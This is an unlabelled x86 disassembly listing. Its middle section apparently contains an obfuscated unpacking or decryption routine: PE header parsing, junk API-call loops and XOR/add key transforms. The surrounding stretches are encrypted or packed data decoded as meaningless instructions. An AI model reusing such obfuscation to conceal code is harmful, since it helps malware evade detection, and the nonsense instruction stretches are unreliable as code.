  4138be:	shl    BYTE PTR ds:0xa5cbf629,0x3e
  4138c5:	dec    ebx
  4138c6:	lods   eax,DWORD PTR ds:[esi]
  4138c7:	cmp    ch,0x90
  4138ca:	push   ds
  4138cb:	cmp    BYTE PTR [ebp+ebp*8-0x46d26ffc],bl
  4138d2:	retf   0x294f
  4138d5:	mov    al,0xe1
  4138d7:	push   esp
  4138d8:	test   ch,bh
  4138da:	fwait
  4138db:	cmp    ecx,DWORD PTR [edi-0x24]
  4138de:	mov    eax,ds:0x3a30b31d
  4138e3:	ja     0x4138ba
  4138e5:	cwde   
  4138e6:	add    BYTE PTR [edx+edx*8],0xf4
  4138ea:	lods   al,BYTE PTR ds:[esi]
  4138eb:	mov    dl,0xf7
  4138ed:	jge    0x413897
  4138ef:	in     al,dx
  4138f0:	cmc    
  4138f1:	cmp    DWORD PTR [esi-0x29c284a0],0x1d59e4a3
  4138fb:	daa    
  4138fc:	sbb    ch,0xcd
  4138ff:	mov    ds:0xef094537,al
  413904:	stos   DWORD PTR es:[edi],eax
  413905:	mov    bl,0x4b
  413907:	pop    esi
  413908:	add    DWORD PTR [eax],edi
  41390a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41390b:	aas    
  41390c:	loopne 0x4138c9
  41390e:	or     al,0xe2
  413910:	daa    
  413911:	dec    ebx
  413912:	int    0xbe
  413914:	mov    dh,0x5a
  413916:	inc    esi
  413917:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413918:	inc    esi
  413919:	jl     0x4138a4
  41391b:	mov    esp,0xd44c3343
  413920:	cld    
  413921:	(bad)  
  413922:	outs   dx,BYTE PTR ds:[esi]
  413923:	mov    eax,ds:0xa54e462
  413928:	sbb    dl,BYTE PTR ds:0x23e4
  41392d:	test   al,0x50
  41392f:	popf   
  413930:	xor    esi,edx
  413932:	or     dh,BYTE PTR [ebx+0x69]
  413935:	ret    
  413936:	je     0x4138d5
  413938:	push   eax
  413939:	add    BYTE PTR [edi],al
  41393b:	imul   edi,DWORD PTR [esi+0x48d4aa6a],0x30da1cb9
  413945:	dec    ecx
  413946:	add    al,0x37
  413948:	inc    eax
  413949:	sbb    edi,DWORD PTR [ebp-0x4c43db10]
  41394f:	adc    DWORD PTR [esi],0xffffffa0
  413952:	push   ss
  413953:	loope  0x4139d0
  413955:	call   0x97f1b741
  41395a:	jo     0x4139ca
  41395c:	xchg   edi,eax
  41395d:	sbb    ebx,edi
  41395f:	ficomp WORD PTR [edx]
  413961:	push   ecx
  413962:	sub    DWORD PTR [edi+0x2d],eax
  413965:	(bad)
  413968:	jle    0x4139db
  41396a:	(bad)  
  41396b:	mov    edx,0xcf1adff2
  413970:	outs   dx,BYTE PTR ds:[esi]
  413971:	je     0x4138fd
  413973:	dec    esi
  413974:	or     al,0x31
  413976:	mov    ah,0xdf
  413978:	test   DWORD PTR [edx+0x52],0x6a11617c
  41397f:	mov    bh,0xac
  413981:	inc    ebx
  413982:	jge    0x4139f6
  413984:	cdq    
  413985:	mov    esp,0x6f037fbb
  41398a:	cmove  ebx,DWORD PTR [edx]
  41398d:	ins    DWORD PTR es:[edi],dx
  41398e:	lahf   
  41398f:	iretw  
  413991:	inc    ebp
  413992:	stos   BYTE PTR es:[edi],al
  413993:	data16 sahf 
  413995:	mov    ebp,0x98bf7d03
  41399a:	out    dx,al
  41399b:	fimul  DWORD PTR [ecx]
  41399d:	mov    ecx,0xdd8ad006
  4139a2:	dec    esi
  4139a3:	mov    ecx,0xf435f59e
  4139a8:	shl    BYTE PTR [ebx+0x36],1
  4139ab:	fs call 0x2d65:0x988f9d35
  4139b3:	pushw  ds
  4139b5:	stos   DWORD PTR es:[edi],eax
  4139b6:	mov    eax,ds:0x1017a4b5
  4139bb:	or     eax,0xedc74b09
  4139c0:	arpl   WORD PTR [ecx+ebx*1+0x45],sp
  4139c4:	inc    esi
  4139c5:	mov    bl,0xa0
  4139c7:	pop    ds
  4139c8:	sbb    ah,dh
  4139ca:	mov    dl,0x87
  4139cc:	(bad)  
  4139cd:	or     DWORD PTR [ebx+0x34bebd02],esi
  4139d3:	lahf   
  4139d4:	dec    esp
  4139d5:	mov    dh,0x25
  4139d7:	hlt    
  4139d8:	loope  0x413a34
  4139da:	push   ebp
  4139db:	(bad)  
  4139dc:	jnp    0x4139d9
  4139de:	jne    0x4139e7
  4139e0:	aaa    
  4139e1:	out    dx,eax
  4139e2:	pusha  
  4139e3:	mov    bl,0x21
  4139e5:	and    DWORD PTR [edi-0xb],ebp
  4139e8:	mov    ebp,cs
  4139ea:	mov    al,ds:0x797c26d6
  4139ef:	in     al,dx
  4139f0:	cmp    eax,0xaf1a2ff
  4139f5:	(bad)  
  4139f6:	mov    ebx,0xe6d56b22
  4139fb:	mov    al,ds:0xd7e61120
  413a00:	mov    ebx,0x865df6dd
  413a05:	int3   
  413a06:	ss dec edi
  413a09:	push   eax
  413a0a:	mov    al,ds:0x5cfb25e9
  413a0f:	test   DWORD PTR gs:[ecx+ecx*8],ebx
  413a13:	call   0x6411:0x8b221db7
  413a1a:	add    al,0x96
  413a1c:	dec    ebp
  413a1d:	inc    ebx
  413a1e:	dec    esp
  413a1f:	xor    BYTE PTR [edi],ah
  413a21:	sbb    BYTE PTR [edi+eiz*4+0x7c],bh
  413a25:	nop
  413a26:	popf   
  413a27:	ins    DWORD PTR es:[edi],dx
  413a28:	and    DWORD PTR [ebp+0x35],eax
  413a2b:	xor    dh,BYTE PTR [edx]
  413a2d:	je     0x413a05
  413a2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413a30:	sub    eax,0xa0eacd5f
  413a35:	sub    al,0xc
  413a37:	popa   
  413a38:	jnp    0x413a98
  413a3a:	push   ds
  413a3b:	fadd   DWORD PTR [esi-0xc1545c6]
  413a41:	popa   
  413a42:	aam    0x4c
  413a44:	xor    al,0x8
  413a46:	mul    ecx
  413a48:	jb     0x413a99
  413a4a:	test   BYTE PTR [eax+0x394cb6d4],ah
  413a50:	push   ebx
  413a51:	mov    eax,ds:0x9129f54b
  413a56:	push   ecx
  413a57:	icebp  
  413a58:	popf   
  413a59:	ja     0x413a09
  413a5b:	or     edi,DWORD PTR [edx-0x7a]
  413a5e:	jb     0x413a59
  413a60:	stos   BYTE PTR es:[edi],al
  413a61:	mov    ds:0xc6d4fe3b,eax
  413a66:	cmp    ah,BYTE PTR [ecx-0x18c19e34]
  413a6c:	inc    esi
  413a6d:	sub    BYTE PTR [ecx],dh
  413a6f:	cmp    al,BYTE PTR [ecx-0x3f]
  413a72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413a73:	scas   eax,DWORD PTR es:[edi]
  413a74:	push   0xfffffff9
  413a76:	and    BYTE PTR [ebx+esi*8+0x43],dh
  413a7a:	sahf   
  413a7b:	icebp  
  413a7c:	iret   
  413a7d:	(bad)  
  413a7e:	pop    edx
  413a7f:	sub    bl,dl
  413a81:	clc    
  413a82:	daa    
  413a83:	mov    ebx,0x10ca744e
  413a88:	bound  ebx,QWORD PTR [esi]
  413a8a:	xchg   esp,eax
  413a8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413a8c:	jns    0x413a99
  413a8e:	retf   0x239d
  413a91:	mov    bl,dh
  413a93:	xchg   BYTE PTR [ebp+0x64e9be5d],cl
  413a99:	(bad)  
  413a9a:	dec    BYTE PTR [eax]
  413a9c:	xchg   esp,eax
  413a9d:	and    BYTE PTR [eax+ecx*8-0x70],0x67
  413aa2:	pop    esi
  413aa3:	adc    dl,ah
  413aa5:	sub    DWORD PTR [esi+0x62],0x4d
  413aa9:	mov    dl,0xe6
  413aab:	adc    edi,DWORD PTR [eax-0xd]
  413aae:	jmp    0x413a34
  413ab0:	out    0xd0,al
  413ab2:	into   
  413ab3:	es jmp 0x51dd:0x47202507
  413abb:	push   0x5d
  413abd:	xchg   ebp,eax
  413abe:	pop    es
  413abf:	aas    
  413ac0:	dec    edx
  413ac1:	fs push 0x68
  413ac4:	(bad)  [ecx-0x777c7bd4]
  413aca:	shr    BYTE PTR [ecx],1
  413acc:	shl    DWORD PTR [eax],0x68
  413acf:	ror    al,0x0
  413ad2:	push   esi
  413ad3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413ad4:	add    al,0x2b
  413ad6:	cmp    al,0xf8
  413ad8:	retf   
  413ad9:	or     al,0x39
  413adb:	lods   al,BYTE PTR ds:[esi]
  413adc:	stc    
  413add:	xor    bl,cl
  413adf:	push   esp
  413ae0:	cwde   
  413ae1:	and    eax,ebp
  413ae3:	sbb    BYTE PTR [edi+0x66],ch
  413ae6:	scas   eax,DWORD PTR es:[edi]
  413ae7:	jns    0x413aea
  413ae9:	rol    DWORD PTR ds:0xf19f83d3,cl
  413aef:	int    0x42
  413af1:	sbb    cl,bl
  413af3:	ins    BYTE PTR es:[edi],dx
  413af4:	sbb    bl,BYTE PTR [edx+0x309474e4]
  413afa:	push   ds
  413afb:	ins    DWORD PTR es:[edi],dx
  413afc:	inc    edx
  413afd:	push   ebp
  413afe:	aad    0xf3
  413b00:	mov    BYTE PTR [edx],bh
  413b02:	mov    ds:0x5e5c1b56,eax
  413b07:	ins    BYTE PTR es:[edi],dx
  413b08:	loop   0x413ae0
  413b0a:	mov    ebx,0xc5c9a135
  413b0f:	pop    esi
  413b10:	ds pop es
  413b12:	lock aas 
  413b14:	shl    DWORD PTR [esi+edi*1+0x13],0xc2
  413b19:	imul   ebp,DWORD PTR [eax-0x62],0x858e6ad5
  413b20:	dec    ebx
  413b21:	sub    DWORD PTR [edx-0x5e],ebp
  413b24:	push   es
  413b25:	mov    ds:0xcffd7f97,al
  413b2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413b2b:	inc    esi
  413b2c:	sbb    eax,0xa633ae5a
  413b31:	cmp    BYTE PTR [esi],dh
  413b33:	pop    edx
  413b34:	xor    DWORD PTR [ebp-0x4d],0x78
  413b38:	daa    
  413b39:	mov    cl,ch
  413b3b:	jmp    0x413ae3
  413b3d:	mov    al,ds:0xb74ab563
  413b42:	mov    esi,0x9b293f26
  413b47:	xor    ah,BYTE PTR [edx-0x7a]
  413b4a:	jl     0x413b23
  413b4c:	shl    DWORD PTR [edx+0x6de85db3],1
  413b52:	int    0xea
  413b54:	in     al,0xd0
  413b56:	xchg   edx,eax
  413b57:	bound  esi,QWORD PTR [ebp+0x62]
  413b5a:	dec    ebx
  413b5b:	and    eax,0x8541b31f
  413b60:	loopne 0x413bdd
  413b62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413b63:	ss mov esi,0xbbeee83
  413b69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413b6a:	or     eax,esi
  413b6c:	sbb    eax,DWORD PTR [eax+0x2f582117]
  413b72:	mov    ebx,0xe906c542
  413b77:	inc    esp
  413b78:	mov    bh,0xc5
  413b7a:	push   0x72
  413b7c:	mov    ebx,0x937b539e
  413b81:	dec    edi
  413b82:	sbb    ecx,ebp
  413b84:	cld    
  413b85:	fst    DWORD PTR [ecx+edx*2]
  413b88:	(bad)  
  413b89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413b8a:	jnp    0x413b61
  413b8c:	dec    ebp
  413b8d:	mul    DWORD PTR [eax+ecx*4+0x28e48527]
  413b94:	jl     0x413b6c
  413b96:	jmp    0xec0e636a
  413b9b:	xor    cl,bh
  413b9d:	pushf  
  413b9e:	or     edi,DWORD PTR [edx+0x7e]
  413ba1:	mov    BYTE PTR [ebx],al
  413ba3:	jbe    0x413b8e
  413ba5:	dec    eax
  413ba6:	cmp    eax,0x82733c7b
  413bab:	in     al,0x89
  413bad:	ret    0x4fa8
  413bb0:	rcl    edx,0x3f
  413bb3:	xchg   edx,eax
  413bb4:	add    BYTE PTR [ecx],ah
  413bb6:	lock mov eax,ds:0x667c42a1
  413bbc:	xchg   DWORD PTR [esi-0x2eff620],esi
  413bc2:	or     bl,BYTE PTR [ebp+0x38]
  413bc5:	jae    0x413c18
  413bc7:	test   BYTE PTR [ebp+0x14],bh
  413bca:	jp     0x413b65
  413bcc:	jnp    0x413c09
  413bce:	lock dec esp
  413bd0:	cli    
  413bd1:	aam    0xa5
  413bd3:	dec    esi
  413bd4:	dec    ebp
  413bd5:	ror    DWORD PTR [eax-0x4e],0x94
  413bd9:	xor    al,0x5
  413bdb:	gs (bad) 
  413bdd:	jl     0x413bf5
  413bdf:	cs xor al,0x55
  413be2:	xchg   edx,eax
  413be3:	mov    DWORD PTR [ebx+eiz*2+0x30f6f4b],0xffd783d1
  413bee:	xor    edx,eax
  413bf0:	xor    edi,0x0
  413bf3:	cmp    edx,esi
  413bf5:	jne    0x413c0d
  413bfb:	cmp    edi,ebx
  413bfd:	jne    0x413c0d
  413c03:	mov    eax,ds:0x421cd2
  413c08:	mov    ds:0x421cda,eax
  413c0d:	pop    edi
  413c0e:	pop    esi
  413c0f:	pop    ebx
  413c10:	pop    ebp
  413c11:	ret    0x8
  413c14:	push   ebp
  413c15:	mov    ebp,esp
  413c17:	push   ecx
  413c18:	mov    eax,ds:0x421aa2
  413c1d:	mov    eax,DWORD PTR [eax]
  413c1f:	add    DWORD PTR ds:0x42901c,eax
  413c25:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  413c2c:	mov    eax,DWORD PTR [ebp+0x8]
  413c2f:	adc    DWORD PTR ds:0x42a010,0x6bac
  413c39:	mov    al,BYTE PTR [eax]
  413c3b:	xor    DWORD PTR ds:0x42b018,0x428020
  413c45:	add    al,0xd
  413c47:	sbb    DWORD PTR ds:0x428004,0x428008
  413c51:	xor    al,0x6f
  413c53:	mov    DWORD PTR ds:0x428004,0x2e21
  413c5d:	cmp    al,0x35
  413c5f:	mov    DWORD PTR ds:0x42a00c,0x23cb
  413c69:	jne    0x413d26
  413c6f:	and    DWORD PTR ds:0x428024,0x429014
  413c79:	mov    eax,DWORD PTR [ebp+0x8]
  413c7c:	dec    edx
  413c7d:	mov    ecx,DWORD PTR [ebp+0x8]
  413c80:	and    edx,DWORD PTR ds:0x42b010
  413c86:	add    ecx,DWORD PTR [eax+0x3c]
  413c89:	mov    edx,0x7510893
  413c8e:	mov    DWORD PTR [ebp+0x8],ecx
  413c91:	and    DWORD PTR ds:0x42c008,0x0
  413c9b:	jmp    0x413cad
  413ca0:	mov    ecx,DWORD PTR ds:0x42c008
  413ca6:	inc    ecx
  413ca7:	mov    DWORD PTR ds:0x42c008,ecx
  413cad:	cmp    DWORD PTR ds:0x42c008,0x18
  413cb4:	jae    0x413cf8
  413cba:	cmp    DWORD PTR ds:0x42c008,0x9
  413cc1:	jne    0x413cd7
  413cc7:	push   0x429014
  413ccc:	push   0x5ace
  413cd1:	call   DWORD PTR ds:0x42403c
  413cd7:	cmp    DWORD PTR ds:0x42c008,0x8
  413cde:	jne    0x413cf3
  413ce4:	xor    ecx,ecx
  413ce6:	or     ecx,DWORD PTR ds:0x42c008
  413cec:	inc    ecx
  413ced:	mov    DWORD PTR ds:0x42c008,ecx
  413cf3:	jmp    0x413ca0
  413cf8:	mov    eax,DWORD PTR [ebp-0x4]
  413cfb:	xor    eax,edx
  413cfd:	push   esi
  413cfe:	mov    esi,DWORD PTR [ebp+0x8]
  413d01:	mov    ecx,0x3272db
  413d06:	add    eax,ecx
  413d08:	cmp    DWORD PTR [esi+0x54],eax
  413d0b:	pop    esi
  413d0c:	je     0x413d1a
  413d12:	mov    eax,DWORD PTR [ebp+0x8]
  413d15:	jmp    0x413d33
  413d1a:	mov    eax,DWORD PTR [ebp-0x4]
  413d1d:	xor    eax,edx
  413d1f:	add    eax,ecx
  413d21:	jmp    0x413d33
  413d26:	mov    eax,DWORD PTR [ebp-0x4]
  413d29:	xor    eax,0x7510893
  413d2e:	add    eax,0x3272db
  413d33:	leave  
  413d34:	ret    0x4
  413d37:	push   ebp
  413d38:	mov    ebp,esp
  413d3a:	sub    esp,0x18
  413d3d:	and    DWORD PTR ds:0x42901c,0x0
  413d47:	jmp    0x413d59
  413d4c:	mov    edx,DWORD PTR ds:0x42901c
  413d52:	inc    edx
  413d53:	mov    DWORD PTR ds:0x42901c,edx
  413d59:	cmp    DWORD PTR ds:0x42901c,0x1a
  413d60:	jae    0x413d92
  413d66:	cmp    DWORD PTR ds:0x42901c,0x22
  413d6d:	jne    0x413d83
  413d73:	push   0x8447
  413d78:	push   0x423868
  413d7d:	call   DWORD PTR ds:0x424040
  413d83:	jmp    0x413d4c
  413d88:	adc    DWORD PTR ds:0x42b010,0x42b00c
  413d92:	mov    DWORD PTR [ebp-0x10],0xf89f85b6
  413d99:	mov    ecx,DWORD PTR ds:0x421a6e
  413d9f:	mov    ecx,DWORD PTR [ecx]
  413da1:	and    DWORD PTR ds:0x42c01c,ecx
  413da7:	lea    eax,[ebp+0x14]
  413daa:	mov    DWORD PTR [ebp-0x4],eax
  413dad:	push   esi
  413dae:	and    DWORD PTR ds:0x428018,0x0
  413db8:	jmp    0x413dca
  413dbd:	mov    esi,DWORD PTR ds:0x428018
  413dc3:	inc    esi
  413dc4:	mov    DWORD PTR ds:0x428018,esi
  413dca:	cmp    DWORD PTR ds:0x428018,0x1a
  413dd1:	jae    0x413e9f
  413dd7:	cmp    DWORD PTR ds:0x428018,0x28
  413dde:	jne    0x413def
  413de4:	push   0x423883
  413de9:	call   DWORD PTR ds:0x424044
  413def:	jmp    0x413dbd
  413df4:	and    DWORD PTR ds:0x42c000,0x0
  413dfe:	mov    edx,DWORD PTR ds:0x42c000
  413e04:	inc    edx
  413e05:	mov    DWORD PTR ds:0x42c000,edx
  413e0b:	cmp    DWORD PTR ds:0x42c000,0x20
  413e12:	jne    0x413e2d
  413e18:	push   0x1ea1
  413e1d:	push   0x42b008
  413e22:	push   0x423946
  413e27:	call   DWORD PTR ds:0x424048
  413e2d:	cmp    DWORD PTR ds:0x42c000,0x11
  413e34:	jb     0x413dfe
  413e3a:	and    DWORD PTR ds:0x42b004,0x0
  413e44:	mov    edx,DWORD PTR ds:0x42b004
  413e4a:	inc    edx
  413e4b:	mov    DWORD PTR ds:0x42b004,edx
  413e51:	cmp    DWORD PTR ds:0x42b004,0xf
  413e58:	jne    0x413e6e
  413e5e:	push   0x428004
  413e63:	push   0x7cc5
  413e68:	call   DWORD PTR ds:0x424014
  413e6e:	cmp    DWORD PTR ds:0x42b004,0xe
  413e75:	jne    0x413e88
  413e7b:	mov    edx,DWORD PTR ds:0x42b004
  413e81:	inc    edx
  413e82:	mov    DWORD PTR ds:0x42b004,edx
  413e88:	cmp    DWORD PTR ds:0x42b004,0x1d
  413e8f:	jb     0x413e44
  413e95:	mov    DWORD PTR ds:0x428014,0x22a8
  413e9f:	mov    esi,0xf89c85b6
  413ea4:	and    DWORD PTR ds:0x428008,0x0
  413eae:	mov    edx,DWORD PTR ds:0x428008
  413eb4:	inc    edx
  413eb5:	mov    DWORD PTR ds:0x428008,edx
  413ebb:	cmp    DWORD PTR ds:0x428008,0x19
  413ec2:	jne    0x413ef2
  413ec8:	push   0x62e7
  413ecd:	push   0x428000
  413ed2:	push   0x75f3
  413ed7:	push   0x428000
  413edc:	push   DWORD PTR [ebp-0x24]
  413edf:	push   0x6458
  413ee4:	push   DWORD PTR [ebp-0x14]
  413ee7:	push   0x5743
  413eec:	call   DWORD PTR ds:0x424018
  413ef2:	cmp    DWORD PTR ds:0x428008,0x14
  413ef9:	jb     0x413eae
  413eff:	xor    ecx,ecx
  413f01:	add    ecx,DWORD PTR ds:0x429008
  413f07:	adc    DWORD PTR ds:0x42c00c,ecx
  413f0d:	mov    DWORD PTR [ebp-0xc],esi
  413f10:	lea    eax,[ebp-0xc]
  413f13:	dec    ecx
  413f14:	mov    DWORD PTR [ebp-0x14],eax
  413f17:	mov    eax,DWORD PTR [ebp-0xc]
  413f1a:	adc    ecx,0x29e6
  413f20:	mov    edx,DWORD PTR [ebp-0x14]
  413f23:	and    DWORD PTR ds:0x428018,0x0
  413f2d:	mov    ecx,DWORD PTR ds:0x428018
  413f33:	inc    ecx
  413f34:	mov    DWORD PTR ds:0x428018,ecx
  413f3a:	cmp    DWORD PTR ds:0x428018,0xb
  413f41:	jne    0x413f52
  413f47:	push   0x4faf
  413f4c:	call   DWORD PTR ds:0x42401c
  413f52:	cmp    DWORD PTR ds:0x428018,0xa
  413f59:	jne    0x413f6c
  413f5f:	mov    ecx,DWORD PTR ds:0x428018
  413f65:	inc    ecx
  413f66:	mov    DWORD PTR ds:0x428018,ecx
  413f6c:	cmp    DWORD PTR ds:0x428018,0x1e
  413f73:	jb     0x413f2d
  413f79:	inc    ecx
  413f7a:	mov    ecx,0x7510893
  413f7f:	neg    DWORD PTR ds:0x42a004
  413f85:	xor    eax,ecx
  413f87:	add    eax,0x3272db
  413f8c:	and    DWORD PTR ds:0x42c010,0x2759
  413f96:	mov    DWORD PTR [edx],eax
  413f98:	mov    edx,DWORD PTR ds:0x421a66
  413f9e:	mov    eax,ds:0x421a76
  413fa3:	sub    edx,eax
  413fa5:	and    edx,DWORD PTR [edx+eax*1]
  413fa8:	mov    eax,ds:0x421ace
  413fad:	inc    DWORD PTR ds:0x42a01c
  413fb3:	mov    edx,DWORD PTR [ebp-0x4]
  413fb6:	and    DWORD PTR ds:0x42a018,0x7b9c
  413fc0:	mov    eax,DWORD PTR [eax]
  413fc2:	and    DWORD PTR ds:0x42c000,0x5f81
  413fcc:	add    eax,DWORD PTR [edx]
  413fce:	movzx  edx,BYTE PTR ds:0x42a014
  413fd5:	or     DWORD PTR ds:0x42a01c,edx
  413fdb:	push   edi
  413fdc:	add    DWORD PTR ds:0x42a004,edx
  413fe2:	mov    DWORD PTR [ebp-0x8],eax
  413fe5:	movzx  edx,WORD PTR ds:0x428004
  413fec:	sbb    DWORD PTR ds:0x42a01c,edx
  413ff2:	mov    edi,DWORD PTR [ebp+0x8]
  413ff5:	and    DWORD PTR ds:0x42b01c,0x631e
  413fff:	mov    eax,ds:0x421c56
  414004:	mov    eax,DWORD PTR [eax+0x198]
  41400a:	xor    edi,ecx
  41400c:	mov    DWORD PTR ds:0x428018,0x14
  414016:	cmp    DWORD PTR ds:0x428018,0x0
  41401d:	je     0x414070
  414023:	cmp    DWORD PTR ds:0x428018,0x3
  41402a:	jne    0x41403e
  414030:	push   DWORD PTR [ebp-0x28]
  414033:	push   0x77dc
  414038:	call   DWORD PTR ds:0x424020
  41403e:	cmp    DWORD PTR ds:0x428018,0x4
  414045:	jne    0x414058
  41404b:	mov    edx,DWORD PTR ds:0x428018
  414051:	dec    edx
  414052:	mov    DWORD PTR ds:0x428018,edx
  414058:	mov    edx,DWORD PTR ds:0x428018
  41405e:	dec    edx
  41405f:	mov    DWORD PTR ds:0x428018,edx
  414065:	jmp    0x414016
  41406a:	and    DWORD PTR ds:0x42c014,ecx
  414070:	mov    edx,0x3272db
  414075:	sbb    DWORD PTR ds:0x429008,0x451c
  41407f:	add    edi,edx
  414081:	mov    DWORD PTR ds:0x42a000,0x2432
  41408b:	cmp    DWORD PTR [eax],edi
  41408d:	je     0x41409a
  414093:	mov    eax,DWORD PTR [eax]
  414095:	jmp    0x41ae5c
  41409a:	mov    eax,DWORD PTR [ebp+0x18]
  41409d:	cmp    eax,esi
  41409f:	jne    0x4140b9
  4140a5:	mov    DWORD PTR ds:0x42a01c,0x2296
  4140af:	push   0xf89c85b5
  4140b4:	jmp    0x41ae4b
  4140b9:	mov    esi,DWORD PTR [ebp+0x18]
  4140bc:	mov    eax,0x2f4e
  4140c1:	mov    eax,0xf89c85b4
  4140c6:	cmp    esi,eax
  4140c8:	jne    0x41ae3b
  4140ce:	sbb    esi,esi
  4140d0:	mov    eax,DWORD PTR [ebp+0x10]
  4140d3:	mov    esi,DWORD PTR ds:0x42c008
  4140d9:	sbb    esi,DWORD PTR ds:0x42a008
  4140df:	mov    DWORD PTR ds:0x42c008,esi
  4140e5:	xor    eax,ecx
  4140e7:	mov    DWORD PTR ds:0x428000,0x1b
  4140f1:	cmp    DWORD PTR ds:0x428000,0x0
  4140f8:	je     0x414161
  4140fe:	cmp    DWORD PTR ds:0x428000,0x4
  414105:	jne    0x414135
  41410b:	push   0x42a000
  414110:	push   0x8ffd
  414115:	push   DWORD PTR [ebp-0x14]
  414118:	push   0x428014
  41411d:	push   0x2d9f
  414122:	push   0x4239c0
  414127:	push   0x4cf3
  41412c:	push   DWORD PTR [ebp-0x1c]
  41412f:	call   DWORD PTR ds:0x424024
  414135:	cmp    DWORD PTR ds:0x428000,0x5
  41413c:	jne    0x41414f
  414142:	mov    esi,DWORD PTR ds:0x428000
  414148:	dec    esi
  414149:	mov    DWORD PTR ds:0x428000,esi
  41414f:	mov    esi,DWORD PTR ds:0x428000
  414155:	dec    esi
  414156:	mov    DWORD PTR ds:0x428000,esi
  41415c:	jmp    0x4140f1
  414161:	add    eax,edx
  414163:	mov    DWORD PTR [ebp-0x18],eax
  414166:	mov    eax,DWORD PTR [ebp+0xc]
  414169:	mov    esi,DWORD PTR [ebp-0x8]
  41416c:	xor    eax,ecx
  41416e:	add    eax,edx
  414170:	imul   eax,DWORD PTR [esi]
  414173:	mov    esi,DWORD PTR [ebp+0x8]
  414176:	xor    esi,ecx
  414178:	add    esi,edx
  41417a:	cmp    esi,eax
  41417c:	mov    eax,DWORD PTR [ebp-0x4]
  41417f:	push   ebx
  414180:	je     0x41419f
  414186:	mov    esi,DWORD PTR [ebp-0x18]
  414189:	add    DWORD PTR [eax],esi
  41418b:	mov    eax,DWORD PTR [ebp-0x4]
  41418e:	mov    esi,DWORD PTR [ebp+0xc]
  414191:	xor    esi,ecx
  414193:	add    esi,edx
  414195:	imul   esi,DWORD PTR [eax]
  414198:	mov    DWORD PTR [eax],esi
  41419a:	jmp    0x4141a4
  41419f:	mov    esi,DWORD PTR [ebp+0x14]
  4141a2:	xor    DWORD PTR [eax],esi
  4141a4:	mov    eax,DWORD PTR [ebp-0x4]
  4141a7:	mov    edi,DWORD PTR [ebp+0x10]
  4141aa:	xor    edi,ecx
  4141ac:	mov    esi,0xffcd8d25
  4141b1:	mov    ebx,esi
  4141b3:	sub    ebx,edi
  4141b5:	add    DWORD PTR [eax],ebx
  4141b7:	mov    eax,DWORD PTR [ebp-0x4]
  4141ba:	mov    edi,DWORD PTR [ebp-0x8]
  4141bd:	add    edi,DWORD PTR [eax]
  4141bf:	mov    DWORD PTR [ebp-0x8],edi
  4141c2:	mov    eax,DWORD PTR [ebp+0xc]
  4141c5:	mov    edi,DWORD PTR [ebp+0xc]
  4141c8:	xor    edi,ecx
  4141ca:	xor    eax,ecx
  4141cc:	lea    eax,[eax+edi*1+0x64e5b6]
  4141d3:	mov    edi,DWORD PTR [ebp+0xc]
  4141d6:	xor    edi,ecx
  4141d8:	add    edi,edx
  4141da:	imul   eax,edi
  4141dd:	mov    edi,DWORD PTR [ebp+0xc]
  4141e0:	xor    edi,ecx
  4141e2:	sub    edi,eax
  4141e4:	mov    eax,DWORD PTR [ebp-0x4]
  4141e7:	add    edi,edx
  4141e9:	cmp    DWORD PTR [eax],edi
  4141eb:	mov    eax,DWORD PTR [ebp-0x4]
  4141ee:	mov    edi,DWORD PTR [ebp+0x10]
  4141f1:	jg     0x414204
  4141f7:	xor    edi,ecx
  4141f9:	mov    ebx,esi
  4141fb:	sub    ebx,edi
  4141fd:	add    DWORD PTR [eax],ebx
  4141ff:	jmp    0x41420a
  414204:	xor    edi,ecx
  414206:	add    edi,edx
  414208:	add    DWORD PTR [eax],edi
  41420a:	mov    eax,DWORD PTR [ebp-0x8]
  41420d:	mov    edi,DWORD PTR [ebp-0x10]
  414210:	mov    eax,DWORD PTR [eax]
  414212:	xor    edi,ecx
  414214:	add    edi,0x3272da
  41421a:	not    edi
  41421c:	and    eax,edi
  41421e:	movsx  di,BYTE PTR [eax+0x1]
  414223:	mov    ebx,0x3b4b
  414228:	sub    di,bx
  41422b:	mov    ebx,0x8a85
  414230:	xor    di,bx
  414233:	mov    ebx,0x4f8a
  414238:	cmp    di,bx
  41423b:	jmp    0x4165fa
  414240:	out    dx,al
  414241:	add    eax,0x6723a723
  414246:	outs   dx,BYTE PTR ds:[esi]
  414247:	sbb    DWORD PTR [edx+0x1b],0xf
  41424b:	hlt    
  41424c:	sbb    eax,0x7d49e7d3
  414251:	inc    esi
  414252:	popa   
  414253:	(bad)  
  414254:	rcr    BYTE PTR [edi+0x62],0x62
  414258:	fwait
  414259:	add    al,0x1d
  41425b:	inc    esi
  41425c:	fwait
  41425d:	push   ds
  41425e:	ins    BYTE PTR es:[edi],dx
  41425f:	or     eax,0xdbffc0b6
  414264:	sub    al,0xe7
  414266:	mov    edx,0x355f823e
  41426b:	(bad)  
  41426c:	xchg   esp,eax
  41426d:	ja     0x414247
  41426f:	call   0xf7bb:0xd46205f4
  414276:	and    DWORD PTR es:[eax],edx
  414279:	lds    edx,FWORD PTR [eax-0x792e9836]
  41427f:	push   ss
  414280:	les    ebx,FWORD PTR ds:0x9bdf4289
  414286:	cmp    bl,bh
  414288:	inc    edi
  414289:	scas   al,BYTE PTR es:[edi]
  41428a:	xlat   BYTE PTR ds:[ebx]
  41428b:	dec    esi
  41428c:	(bad)  
  41428d:	sbb    BYTE PTR [ebx-0x69],bh
  414290:	inc    edx
  414291:	jo     0x41423d
  414293:	add    al,0xcb
  414295:	sub    DWORD PTR [ebp+edx*4+0x3d2e14ca],edi
  41429c:	mov    WORD PTR [ebp+0x137bca28],?
  4142a2:	iret   
  4142a3:	popa   
  4142a4:	xor    eax,0xc5a208e6
  4142a9:	pop    ebp
  4142aa:	daa    
  4142ab:	lods   eax,DWORD PTR ds:[esi]
  4142ac:	xlat   BYTE PTR ds:[ebx]
  4142ad:	cld    
